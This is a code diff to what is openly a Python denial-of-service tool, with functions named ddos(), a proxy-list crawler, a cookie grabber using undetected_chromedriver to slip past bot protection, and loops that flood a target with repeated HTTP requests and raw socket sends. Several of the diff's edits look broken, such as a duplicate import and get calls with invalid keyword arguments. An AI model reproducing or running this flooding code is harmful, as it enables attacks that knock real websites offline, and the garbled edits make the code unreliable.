@@ -7,6 +7,8 @@ import undetected_chromedriver as webdriver
 from os import system, name
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket
 import httpx
+from requests.cookies import RequestsCookieJar
+import undetected_chromedriver as webdriver
 from httpx import AsyncClient, Headers
 import socket
 from urllib.parse import urlparse
@@ -52,7 +54,7 @@ def countdown(times):
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
             return
 
-def get_cookie():
+def get_cookie(ip):
     global useragent, cookieJAR, cookie
     options = webdriver.ChromeOptions()
     arguments = [
@@ -1804,9 +1806,9 @@ socksFile = ("socks5.txt")
 def socksCrawler():
     global socksFile, socksResources
     f = open("socks5.txt",'wb')
-    for url in proxyResources:
+    for ura in proxyResources:
         try:
-            f.write(requests.get(url).content)
+            f.write(requests.get(ura).content)
         except:
             pass
     f.close()
@@ -2504,7 +2506,6 @@ def Headerss(method):
 def ddos():
     socksCrawler()
     socksCrawlz()
-    get_cookie()
     session = requests.Session()
     scraper = cloudscraper.create_scraper(sess=session)
     jar = RequestsCookieJar()
@@ -2559,10 +2560,10 @@ def ddos():
             scraper.get(ip, proxz=proxy)
             scraper.get(ip, proxz=proxy)
             scraper.get(ip, proxz=proxy)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(ip=url, headers=headers, allow_redirects=False)
+            scraper.get(ip=url, headers=headers, allow_redirects=False)
+            scraper.get(ip=url, headers=headers, allow_redirects=False)
+            scraper.get(ip=url, headers=headers, allow_redirects=False)
             s.send(data)
             s.send(data)
             s.send(data)
